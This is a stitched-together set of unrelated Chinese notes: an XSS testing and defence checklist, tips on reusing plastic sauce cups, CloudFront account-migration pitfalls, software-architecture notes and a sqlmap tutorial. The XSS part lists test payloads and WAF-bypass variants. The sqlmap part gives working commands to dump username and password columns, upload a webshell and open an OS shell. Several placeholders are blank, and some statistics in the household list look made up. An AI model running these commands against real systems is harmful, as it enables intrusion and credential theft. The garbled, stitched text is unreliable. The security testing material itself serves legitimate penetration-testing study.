[expanded] [blog] XSS跨站脚本攻击

原始问题: [blog] XSS跨站脚本攻击

XSS 跨站脚本攻击防御与检测技能清单

场景占位: 攻击者向 注入 , 用户 访问触发, 管理员 成为高价值目标
阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手

1. 把管理员当首要攻击面,不只防护普通用户

  • 规则: XSS 防御必须覆盖管理后台所有输入输出点,管理员是攻击者的真实目标
  • 为什么: 管理员权限可操作文件/数据库,XSS 通过管理员身份实现”客户端攻击变服务端攻击”的跳板
  • 踩坑: 只在前台表单做过滤,后台留言板/日志查看等功能未防护,管理员查看恶意内容时中招
  • 例外: 完全隔离的只读审计日志系统(但仍需编码输出)

2. 输出编码比输入过滤更可靠

  • 规则: 在数据输出到 HTML/JS/URL 时做上下文相关编码,而非仅在输入时黑名单过滤
  • 为什么: 输入过滤容易被绕过(双重编码/大小写/Unicode变体),输出编码在最后一道关卡确保浏览器不解析为代码
  • 踩坑: 用正则删除 <script> 标签,攻击者用 <img onerror=...> 或 <svg onload=...> 绕过
  • 例外: 富文本编辑器场景需白名单+CSP组合拳

3. 反射型 XSS 的危害被低估,中危不等于可忽略

  • 规则: 反射型 XSS 虽需诱导点击,但结合钓鱼/短链可批量攻击,必须修复
  • 为什么: 攻击者可伪造 的钓鱼链接,用户看到可信域名会降低警惕,点击率远超想象
  • 踩坑: 认为”需要用户点击恶意链接”就不修复,实际 APT 攻击常用此作为初始入口
  • 例外: 完全内网且无邮件/IM 的隔离环境

4. 存储型 XSS 检测要追踪数据流,不只测当前页面

  • 规则: 输入点在 的数据可能在 //管理后台显示,需全链路测试
  • 为什么: 留言板输入的恶意脚本可能在用户中心/管理审核页/统计报表等多处回显,单点测试会漏检
  • 踩坑: 在评论框插入 payload 后只刷新评论列表,未检查个人主页/通知中心/后台审核页
  • 例外: 明确标注为”仅当前会话”的临时数据

5. DOM 型 XSS 不经过服务端,查源码看不到

  • 规则: 用浏览器开发者工具动态调试 JS,关注 location.hash document.write innerHTML 等 DOM 操作
  • 为什么: Payload 在 URL 片段标识符(#后)或前端 JS 直接处理,HTTP 请求响应中完全看不到恶意代码
  • 踩坑: 用 Burp 抓包重放测试,但 DOM XSS 的参数在 # 后不会发送到服务器,抓不到包
  • 例外: 服务端渲染(SSR)且无前端路由的传统应用

6. 手工测试先用特殊字符探测,不直接上完整 payload

  • 规则: 输入 '";>< 加唯一标识如 xss2024test,查看响应源码中这些字符是否被转义
  • 为什么: 直接输入 <script>alert(1)</script> 可能触发 WAF 封禁 IP,特殊字符探测既隐蔽又能快速判断过滤强度
  • 踩坑: 第一次测试就用 <svg/onload=alert(1)>,被 WAF 拦截后无法继续测试
  • 例外: 已确认无 WAF 的内部测试环境

7. 构造闭合是 XSS 利用的核心技巧

  • 规则: 根据唯一标识符在源码中的位置,闭合前面的标签/引号,再注入恶意代码
  • 为什么: 输入点可能在 <input value="这里"> 或 <script>var a="这里"</script> 等不同上下文,需不同闭合方式
  • 踩坑: 所有场景都用 <script>alert(1)</script>,在 <input value="<script>..."> 中无法执行
  • 例外: 输出点已在独立 script 标签且无引号包裹(极少见)

8. 工具扫描结果需人工验证,误报率高

  • 规则: AWVS/AppScan 报告的 XSS 必须手工复现,确认弹窗或执行任意 JS 才算漏洞
  • 为什么: 扫描器只检测特殊字符是否回显,不判断是否真正可执行,很多是 HTML 注释内或已转义的误报
  • 踩坑: 直接把扫描器报告交给开发,开发验证后发现是误报,降低安全团队可信度
  • 例外: 已知准确率高的自研扫描规则

9. 测试 XSS 时注意 HttpOnly 和 CSP 防御层

  • 规则: 即使弹窗成功,检查 Cookie 是否有 HttpOnly 标志,页面是否有 Content-Security-Policy 响应头
  • 为什么: XSS 能执行不代表能窃取 Cookie(HttpOnly 阻止),也不代表能加载外部恶意脚本(CSP 限制)
  • 踩坑: 演示时只展示 alert(document.cookie) 弹窗,实际 Cookie 有 HttpOnly 无法窃取,业务方认为影响不大
  • 例外: 目标是 DOM 操作或钓鱼而非窃取凭证

10. 反射型 XSS 的 payload 要 URL 编码后再发送

  • 规则: 构造好的 <img src=x onerror=alert(1)> 需编码为 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E 放入 URL
  • 为什么: 浏览器/代理会自动解码 URL 参数,未编码的特殊字符可能被截断或误解析
  • 踩坑: 直接复制 http://<TARGET>?q=<script>alert(1)</script> 到浏览器,<> 被浏览器处理导致测试失败
  • 例外: 使用 Burp Repeater 等工具直接发送原始 HTTP 请求

11. 查找输入点要包含非显性输入

  • 规则: 除表单外,检查 Referer/User-Agent/Cookie/X-Forwarded-For 等 HTTP 头是否会回显
  • 为什么: 日志查看/错误页面/统计分析等功能可能输出这些头部,开发常忽略对其过滤
  • 踩坑: 只测试可见表单,漏掉后台”访问日志”功能显示 User-Agent 导致的存储型 XSS
  • 例外: 完全不记录 HTTP 头的纯 API 服务

12. 富文本场景用白名单+DOMPurify,不自己写过滤

  • 规则: 允许用户输入 HTML 时,使用成熟的白名单库(如 DOMPurify)过滤,禁止自研正则方案
  • 为什么: HTML 解析极其复杂,自研方案必被绕过(mutation XSS/mXSS),DOMPurify 有专业团队维护
  • 踩坑: 用正则 /<script.*?>.*?<\/script>/gi 删除脚本,攻击者用 <noscript><p title="</noscript><img src=x onerror=alert(1)>"> 绕过
  • 例外: 完全禁止 HTML 输入的纯文本场景

13. 测试时用唯一标识追踪,不用通用 payload

  • 规则: 每个输入点用不同标识如 xsstest_<INPUT_NAME>_<TIMESTAMP>,便于在大量输出中定位
  • 为什么: 同时测试多个输入点时,通用 alert(1) 无法判断是哪个点触发,唯一标识可精确溯源
  • 踩坑: 10 个表单都输入 <script>alert(1)</script>,弹窗后不知道是哪个字段存在漏洞
  • 例外: 单一输入点的快速验证

14. 存储型 XSS 要测试权限隔离,避免自己打自己

  • 规则: 用 插入 payload,用 访问触发,确认跨用户攻击可行
  • 为什么: 很多应用只对当前用户回显自己的输入,无法攻击其他用户,不算真正的存储型 XSS
  • 踩坑: 自己发评论自己看到弹窗就报漏洞,实际其他用户看到的是过滤后的安全内容
  • 例外: 明确为”个人笔记”等单用户功能

15. 绕过 WAF 时用编码变换和标签变体

  • 规则: 尝试 HTML 实体编码 &lt; 大小写混淆 <ScRiPt> 或冷门标签 <details open ontoggle=alert(1)>
  • 为什么: WAF 规则基于黑名单,无法穷举所有变体,浏览器解析比 WAF 更宽容
  • 踩坑: 被拦截后放弃,实际换个编码方式或标签就能绕过
  • 例外: 白名单 WAF 或基于语义分析的高级防护

🔥 5 秒必记 5 条

  1. 管理员是 XSS 的真实目标,后台必须严防
  2. 输出编码 > 输入过滤,在最后关卡做上下文相关转义
  3. 存储型 XSS 要追踪数据流,输入点和输出点可能在不同页面
  4. DOM XSS 不经过服务端,抓包看不到要用浏览器调试
  5. 先用特殊字符探测再构造闭合,不直接上完整 payload

[expanded] 一次性的蘸料小塑料盒怎么废物利用

原始问题: 一次性的蘸料小塑料盒怎么废物利用

一次性塑料蘸料盒再利用技能清单

场景占位: 外卖/超市附赠的 (5-50ml 常见规格)
阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手

1. 优先用于干燥物收纳而非液体二次存储

  • 规则: 清洗后装纽扣/药片/种子等干货,避免长期装油盐酱醋
  • 为什么: 一次性塑料盒密封圈老化快(3-7 天),二次装液体易渗漏污染抽屉;且非食品级材料遇油脂会析出增塑剂
  • 踩坑: 装酱油放冰箱一周后发现抽屉全是黏液,塑料盒盖已翘边
  • 例外: 仅用于单次冷冻分装(如冻高汤块),用完即弃

2. 育苗前必须底部戳 3-5 个排水孔

  • 规则: 用烧红的针/螺丝刀在盒底均匀戳孔,孔径 2-3mm
  • 为什么: 原装盒完全密封,积水会让种子/幼苗根系腐烂;官方园艺教程默认你用专业育苗盘
  • 踩坑: 直接装土种多肉,三天后发现土壤发臭,根全烂了

3. 车载/包内使用需配外壳固定

  • 规则: 单独放入硬质收纳盒或用橡皮筋捆绑,禁止裸放
  • 为什么: 薄壁塑料盒抗压能力 <0.5kg,书包/车门储物格挤压会瞬间爆裂,硬币/药片撒一地
  • 踩坑: 放硬币在中控台,急刹车后盒子碎裂,硬币卡进座椅缝隙

4. 冷冻用途限单次且标注日期

  • 规则: 冻饺子/冰块仅用一次,解冻后丢弃;必须用油性笔写日期
  • 为什么: 冷冻-解冻循环会让塑料脆化,第二次使用破裂率 >60%;无标注会忘记冷冻时长导致食物变质
  • 踩坑: 冻了三次的盒子拿出来直接碎成片,饺子粘了一冰箱碎塑料

5. 儿童手工场景禁止装液体颜料

  • 规则: 只装固体材料(珠子/贴纸/橡皮泥),液体颜料必须用原装瓶
  • 为什么: 儿童操作力度不稳,盖子易被拧歪;颜料渗漏后塑料表面染色无法清洗,且污染其他玩具
  • 踩坑: 装水彩颜料给孩子,十分钟后桌面/衣服全是红色,盒子盖已丢失

6. 宠物食盆用途限干粮且每日更换

  • 规则: 仅装猫粮/狗粮等干燥食物,湿粮/水禁用;24 小时后必须换新盒
  • 为什么: 宠物唾液+湿粮会在 6-8 小时内滋生细菌,塑料表面划痕藏污纳垢;且宠物啃咬会产生尖锐碎片误食
  • 踩坑: 装湿粮两天后宠物腹泻,盒子边缘已被咬出裂口

7. 首饰收纳需垫绒布防氧化

  • 规则: 盒底铺一层绒布/无纺布再放银饰/合金饰品
  • 为什么: 塑料盒内壁残留的增塑剂会加速金属氧化,银饰 3-5 天变黑;官方首饰盒都有植绒内衬
  • 踩坑: 直接放银耳钉,一周后取出发现已发黑需抛光

8. 药品分装必须剪原包装标签贴盒上

  • 规则: 把药板的名称/效期部分剪下贴在盒盖,或用标签机打印
  • 为什么: 散装药片 90% 会忘记名称和效期,误服过期药或吃错药风险极高;塑料盒透明度差,不开盖看不清内容
  • 踩坑: 三个盒子装了白色药片,急用时完全分不清哪个是止痛哪个是降压

9. 厨房调味盒需选 PP 材质且避光存放

  • 规则: 检查盒底回收标志,仅 PP(5 号)可用;装好后放抽屉/柜内
  • 为什么: PS/PET 材质遇盐/糖会析出有害物;透明盒受光照会让香料/糖氧化变质,辣椒粉褪色
  • 踩坑: 用 PS 盒装盐放灶台,两个月后盒子变形,盐结块且有异味
  • 例外: 仅装一次性用量(如野餐带调料)可忽略材质

10. 回收前必须撕掉所有贴纸和胶带

  • 规则: 清洗后用吹风机加热撕除标签,残胶用酒精擦净
  • 为什么: 回收厂的光学分拣设备会把带标签的盒子识别为”污染物”剔除,导致可回收塑料进入焚烧流程
  • 踩坑: 直接扔进可回收桶,实际被垃圾站二次分拣时当干垃圾处理

11. 叠放收纳不超过 8 层

  • 规则: 同规格盒子叠放高度 ≤ 15cm(约 8 个),超过需分堆
  • 为什么: 底层盒子承重超 0.8kg 会永久变形,盖子扣不紧;且高堆倒塌会产生噪音和散落
  • 踩坑: 叠了 20 个盒子,最底下三个已压扁无法使用

12. 水培容器需 48 小时换水一次

  • 规则: 豆芽/水培植物必须每两天倒掉旧水加新水
  • 为什么: 小容积(< 100ml)水体无循环系统,溶氧 12 小时耗尽,根系缺氧腐烂产生臭味
  • 踩坑: 水培绿萝一周没换水,根系全黑且水体浑浊发臭

🔥 5 秒必记 5 条

  1. 干货收纳优先,液体存储必失败
  2. 育苗必戳底孔,冷冻只用一次
  3. 儿童/宠物场景禁液体
  4. 药品/调味必贴标签注明
  5. 回收前撕标签否则白分类

[expanded] CloudFront distribution 跨账号迁移最容易踩的坑

原始问题: CloudFront distribution 跨账号迁移最容易踩的坑

CloudFront Distribution 跨账号迁移技能点清单

场景占位: 源账号 , 目标账号 , CNAME , Distribution ID
阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手

1. 先在目标账号创建 Distribution,再删源账号 CNAME 绑定

  • 规则: 在 创建新 Distribution 时不要立即添加 ,等 的 Distribution 解绑 CNAME 后再添加
  • 为什么: AWS 全局唯一性检查会阻止同一 CNAME 同时绑定两个 Distribution,即使跨账号也不行,错误信息是 CNAMEAlreadyExists
  • 踩坑: 以为跨账号可以并行配置,结果新 Distribution 创建失败或卡在 InProgress 状态数小时
  • 例外: 使用 CloudFormation StackSets 跨区域部署时,需要在删除旧资源的 DependsOn 中显式声明依赖

2. 证书必须在 us-east-1 申请且目标账号提前准备好

  • 规则: 如果 使用自定义 SSL 证书,必须在 的 us-east-1 区域提前申请 ACM 证书并完成验证
  • 为什么: CloudFront 是全局服务但只认 us-east-1 的证书,跨账号迁移时无法共享证书,DNS 验证需要 5-30 分钟
  • 踩坑: 迁移当天才申请证书,DNS 验证延迟导致计划内 5 分钟停机变成 40 分钟
  • 例外: 使用 CloudFront 默认证书(*.cloudfront.net)不受此限制

3. 解绑 CNAME 需要等 Distribution 状态变为 Deployed 才生效

  • 规则: 从 删除 CNAME 配置后,必须等待 Distribution 状态从 InProgress 变为 Deployed(通常 15-20 分钟),才能在 添加
  • 为什么: AWS 后台需要将配置同步到全球边缘节点,状态未完成前 CNAME 占用锁不会释放
  • 踩坑: 看到控制台显示 CNAME 已删除就立即在新账号添加,结果报错 CNAMEAlreadyExists,反复重试浪费 1 小时
  • 例外: 使用 AWS CLI 的 wait distribution-deployed 命令可自动轮询状态

4. DNS TTL 必须提前降到 60 秒并等待老 TTL 过期

  • 规则: 迁移前 24-48 小时将 的 DNS 记录 TTL 从默认值(通常 300-3600 秒)降至 60 秒
  • 为什么: 切换 DNS 指向新 Distribution 时,客户端和递归 DNS 会缓存老记录,高 TTL 导致部分用户长时间访问旧 Distribution 甚至 404
  • 踩坑: 保持 TTL 1800 秒,切换后发现 30% 用户仍访问老 Distribution,被迫回滚
  • 例外: 内部系统且能控制所有客户端 DNS 缓存时可跳过

5. Origin 访问权限需要在目标账号重新配置 OAI/OAC

  • 规则: 如果源是 S3 且使用 Origin Access Identity(OAI)或 Origin Access Control(OAC),需在 创建新 OAI/OAC 并更新 S3 bucket policy
  • 为什么: OAI/OAC 是账号级资源,无法跨账号复用,bucket policy 中的 Principal 必须指向新账号的 OAI/OAC ARN
  • 踩坑: 复制了 Distribution 配置但忘记更新 S3 权限,新 Distribution 返回 403 Forbidden
  • 例外: Origin 是公开 S3 website endpoint 或自定义 HTTP 源不受影响

6. Lambda@Edge 函数需要在 us-east-1 重新部署并关联

  • 规则: Lambda@Edge 函数必须在 的 us-east-1 重新创建,execution role 需要信任 lambda.amazonaws.com 和 edgelambda.amazonaws.com
  • 为什么: Lambda@Edge 函数版本 ARN 包含账号 ID,跨账号无法引用,且只能在 us-east-1 创建后自动复制到边缘节点
  • 踩坑: 直接复制函数代码但忘记发布新版本(必须是带版本号的 ARN 不能是 $LATEST),Distribution 部署失败
  • 例外: 不使用 Lambda@Edge 可跳过,CloudFront Functions 同样需要在新账号重建

7. 日志配置的 S3 bucket 需要授权新 Distribution 写入

  • 规则: 如果启用访问日志,目标 S3 bucket 的 ACL 或 bucket policy 必须允许 CloudFront 日志投递服务(awslogsdelivery)写入
  • 为什么: CloudFront 使用特定服务账号投递日志,新 Distribution 的日志投递权限需要显式授予,否则日志静默丢失
  • 踩坑: 迁移后发现日志停止更新 3 天才注意到,丢失关键访问数据用于故障排查
  • 例外: 禁用日志或使用 CloudWatch Logs 集成(实时日志)不受影响

8. WAF Web ACL 需要在目标账号重建或使用 Firewall Manager 共享

  • 规则: WAF Web ACL 是区域资源(CloudFront 关联的是 us-east-1 global),需在 重新创建规则或通过 AWS Firewall Manager 跨账号管理
  • 为什么: Web ACL ARN 包含账号 ID,跨账号无法直接关联,规则需要逐条迁移(IP sets/regex pattern sets 也需要重建)
  • 踩坑: 以为 WAF 是全局服务可以跨账号引用,新 Distribution 上线后遭受原本被阻挡的攻击流量
  • 例外: 不使用 WAF 可跳过,使用 AWS Managed Rules 可快速在新账号启用相同规则集

9. 切换 DNS 前必须验证新 Distribution 的 CloudFront 域名可访问

  • 规则: 修改 的 DNS 记录前,先用新 Distribution 的 *.cloudfront.net 域名 + Host header 测试完整请求链路
  • 为什么: DNS 切换是单向操作,回滚需要等 TTL,提前用 curl -H “Host: “ https://.cloudfront.net 可发现 Origin/证书/缓存配置问题
  • 踩坑: 直接切换 DNS 后发现新 Distribution 的 Origin 配置错误返回 502,紧急回滚但 25% 用户已受影响
  • 例外: 蓝绿部署使用加权 DNS 记录可逐步切流,但仍需提前测试

10. 使用 Invalidation 清除缓存会产生跨账号计费差异

  • 规则: 迁移后前 1000 次 invalidation paths 免费额度重新计算,但老 Distribution 的缓存不会自动失效
  • 为什么: 两个账号的 CloudFront 免费额度独立,老 Distribution 禁用前其缓存仍在边缘节点(可能 24 小时),可能导致部分用户看到过期内容
  • 踩坑: 迁移后未 invalidate 老 Distribution,部分用户缓存命中老节点看到旧版静态资源,CSS/JS 版本不匹配页面错乱
  • 例外: 使用版本化 URL(如 /static/v2/app.js)或短 Cache-Control max-age 可避免

11. 迁移窗口选择需避开 CloudFront 全球部署高峰时段

  • 规则: 避免在 UTC 工作日 14:00-18:00(对应美东上午)执行迁移,这是 CloudFront 配置变更部署最慢的时段
  • 为什么: AWS 全球客户集中在此时段变更配置,边缘节点同步队列拥堵,Distribution 状态从 InProgress 到 Deployed 可能超过 40 分钟
  • 踩坑: 选择北京时间晚上 10 点(UTC 14:00)迁移,预期 15 分钟的部署耗时 50 分钟,超出维护窗口
  • 例外: 紧急故障恢复场景无法选择时段,需在变更计划中预留 2 倍时间 buffer

12. 保留老 Distribution 禁用状态 7 天用于应急回滚

  • 规则: 迁移成功后不要立即删除 的 Distribution,先 Disable 保留 7 天,确认无问题再删除
  • 为什么: Disable 状态不计费但保留配置,如果新 Distribution 出现隐藏问题(如特定地区 POP 节点异常),可快速 Enable 老 Distribution 并回滚 DNS
  • 踩坑: 迁移当天删除老 Distribution,第 3 天发现新 Distribution 在亚太区域 30% 请求 timeout,无法快速回滚只能紧急修复
  • 例外: 合规要求必须立即删除资源时,至少导出完整配置 JSON 留存

13. 自定义错误页面的 S3 路径需要更新 bucket 引用

  • 规则: 如果配置了自定义错误响应(如 404 返回 /error.html),且错误页面存储在 S3,需确认 的 S3 bucket 包含相同路径文件
  • 为什么: CloudFront 错误页面配置只存储路径不存储完整 URL,跨账号后如果 bucket 名称或路径变化会导致错误页面失效返回默认 CloudFront 错误
  • 踩坑: 老账号使用 s3://account-a-errors/404.html,新账号 bucket 改名为 account-b-assets,忘记更新错误页面路径,用户看到原始 XML 错误
  • 例外: 错误页面使用 Origin 相对路径(如 /errors/404.html)且 Origin 配置正确则不受影响

14. Trusted Key Groups 签名 URL 需要在目标账号重新生成密钥对

  • 规则: 如果使用签名 URL/Cookie(私有内容),需在 创建新 public key 并更新 Trusted Key Groups,所有签名 URL 生成逻辑需使用新私钥
  • 为什么: CloudFront 签名验证基于 key pair ID 和账号绑定,跨账号后老签名 URL 全部失效,需要应用层同步更新签名密钥
  • 踩坑: 迁移后移动 App 内的签名 URL 全部返回 403,需要强制用户更新 App 版本重新获取签名 URL,影响 10 万用户
  • 例外: 使用 CloudFront 签名 Cookie 可在迁移时同时下发新旧两组 Cookie 实现平滑过渡

15. 监控告警需要在目标账号重建 CloudWatch Alarms 和 Dashboard

  • 规则: CloudFront metrics(4xxErrorRate/5xxErrorRate 等)是账号级资源,需在 重新创建 CloudWatch Alarms 和 SNS 通知
  • 为什么: 跨账号后老告警不会自动触发,如果忘记重建监控,新 Distribution 故障时运维团队不会收到通知
  • 踩坑: 迁移后新 Distribution 5xxErrorRate 飙升到 15% 持续 2 小时无人知晓,直到用户投诉才发现
  • 例外: 使用第三方监控(Datadog/New Relic)且配置了新账号 IAM role 可自动采集新 Distribution metrics

单体架构

在单体架构的体系内，对象关系映射（ORM）框架是一个至关重要的组件，其主要功能在于抽象化和简化数据库的增删改查（CRUD）操作。ORM通过封装底层数据库操作的复杂性，显著提升了数据访问层的开发效率。ORM框架的核心功能在于将关系型数据库中的数据模型转换为应用程序中的对象模型，实现了数据访问的抽象化。此种映射机制有效地减少了开发者在进行数据库交互时所需编写的代码量，从而使得开发人员能够将更多的精力投入到业务逻辑的实现上，而非数据访问的具体技术细节。

优点:

  • 开发的便捷性、部署的简洁性以及相对易于管理的横向扩展能力
  • 开发人员能够在一个统一的代码库中进行快速的迭代和调试，从而加速了开发进程

缺点:

  • 系统的任何微小改动都可能触发对整个应用程序的重新部署，这不仅加剧了维护工作的复杂性，也提高了系统潜在的错误风险
  • 单体架构在处理大规模用户或数据时，其横向扩展能力受到限制，性能瓶颈成为一个显著问题

基本框架：

  • 前端 - angular jq 模版引擎ecshop(smart)
  • 后台 - Java(spring mvc, Struts2) PHP(Yii2 zendFramework2, thinkphp3.2)

多层架构

应用程序被细分为多个层次，主要包括表现层（用户界面）、业务逻辑层和数据访问层，这一模式通常被称作模型-视图-控制器（MVC）。这种分层的设计方法允许每一层独立进行开发和测试，从而显著提升了代码的可管理性和可维护性。

多层架构的设计理念体现了专业领域分工的细化，即所谓的垂直领域专业化。它是社会分工精细化趋势在软件开发领域的体现。在这种架构中，前后端的分离正是一种垂直拆分的实践，而MVC本身也是垂直架构的一个典型示例。

优点:

  • 尽管层与层之间的耦合较单体架构有所减少
    缺点:
  • 某一层的变更仍有可能引发连锁反应，影响到其他层的稳定性和功能。

一般会采用敏捷开发杜绝此类现象，产品周期性迭代

读写分离的数据库架构

原因：
公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。

解决方案：读写分离
数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离

有了锁的概念 读写锁 乐观锁 悲观锁

用消息队列的架构

原因：
相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。

解决方案：消息队列
我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。
随着业务的发展，公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。

过度阶段 面向服务的架构SOA

原因：
软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。

单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。

这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。

通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。

微服务架构

微服务架构（Microservices Architecture）的兴起源于对传统应用架构的局限性的突破。随着信息技术和互联网的快速发展，企业对于应用的扩展性、可靠性和维护性提出了更高的要求。传统应用架构由于其整体性和复杂性，逐渐难以满足这些需求。在这样的背景下，微服务架构应运而生，以其独特的优势，逐渐成为分布式系统设计的主流架构之一。

微服务架构是一种分布式系统架构，其核心思想是将一个复杂的应用分解为一组相互协作的微小服务。每个微服务都是独立的业务单元，运行在自己的进程中，并通过轻量级的通信机制（如HTTP RESTful API）相互协作。这些服务围绕业务功能构建，每个服务都有自己的业务逻辑和数据存储，可以独立部署和扩展。

不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。

将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。

优点:

  • 它通过模块化提高了系统的可维护性和可扩展性。每个微服务都是独立的模块，可以单独开发和部署，不会影响到其他服务。
  • 微服务架构通过服务之间的松耦合，提高了系统的可靠性
  • 每个服务都有自己的数据存储，避免了单点故障的风险。此外，微服务架构支持技术多样性，每个服务都可以选择最适合其业务需求的技术栈，从而充分发挥各种技术的优势。

缺点:

  • 相较于传统应用架构，微服务架构更为复杂，需要更多的管理和协调工作。管理难度大

sqlmap简介

sqlmap支持五种不同的注入模式：

  • 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
  • 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
  • 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
  • 4、联合查询注入，可以使用union的情况下的注入。
  • 5、堆查询注入，可以同时执行多条语句的执行时的注入。

sqlmap支持的数据库有

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

检测注入

基本格式

sqlmap -u "http://www.vuln.cn/post.php?id=1"

默认使用level1检测全部数据库类型

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

跟随302跳转

当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，
当注入错误的时候，先报错再跳转的时候，不需要跟随302。
目的就是：要追踪到错误信息。

cookie注入

当程序有防get注入的时候，可以使用cookie注入
sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）

从post数据包中注入

可以使用burpsuite或者temperdata等工具来抓取post包

sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql    指定username参数

注入成功后

获取数据库基本信息

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 --dbs

查询有哪些数据库

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test --tables

查询test数据库中有哪些表

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test -T admin --columns

查询test数据库中admin表有哪些字段

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test -T admin -C "username,password" --dump

dump出字段username与password中的数据

其他命令参考下面

从数据库中搜索字段

sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password
在dedecms数据库中搜索字段admin或者password。

读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
#示例：
sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"

使用shell命令：

sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell
接下来指定网站可写目录：
“E:\php\htdocs\dvwa”

#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）

sqlmap详细命令：

  • --is-dba 当前用户权限（是否为root权限）
  • --dbs 所有数据库
  • --current-db 网站当前数据库
  • --users 所有数据库用户
  • --current-user 当前数据库用户
  • --random-agent 构造随机user-agent
  • --passwords 数据库密码
  • --proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
  • --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

Options（选项）：

  • --version 显示程序的版本号并退出
  • -h, --help 显示此帮助消息并退出
  • -v VERBOSE 详细级别：0-6（默认为1）

Target（目标）：

以下至少需要设置其中一个选项，设置目标URL。

  • -d DIRECT 直接连接到数据库。
  • -u URL, --url=URL 目标URL。
  • -l LIST 从Burp或WebScarab代理的日志中解析目标。
  • -r REQUESTFILE 从一个文件中载入HTTP请求。
  • -g GOOGLEDORK 处理Google dork的结果作为目标URL。
  • -c CONFIGFILE 从INI配置文件中加载选项。

Request（请求）：

这些选项可以用来指定如何连接到目标URL。

  • --data=DATA 通过POST发送的数据字符串
  • --cookie=COOKIE HTTP Cookie头
  • --cookie-urlencode URL 编码生成的cookie注入
  • --drop-set-cookie 忽略响应的Set - Cookie头信息
  • --user-agent=AGENT 指定 HTTP User - Agent头
  • --random-agent 使用随机选定的HTTP User - Agent头
  • --referer=REFERER 指定 HTTP Referer头
  • --headers=HEADERS 换行分开，加入其他的HTTP头
  • --auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
  • --auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
  • --auth-cert=ACERT HTTP认证证书（key_file，cert_file）
  • --proxy=PROXY 使用HTTP代理连接到目标URL
  • --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
  • --ignore-proxy 忽略系统默认的HTTP代理
  • --delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
  • --timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
  • --retries=RETRIES 连接超时后重新连接的时间（默认3）
  • --scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
  • --safe-url=SAFURL 在测试过程中经常访问的url地址
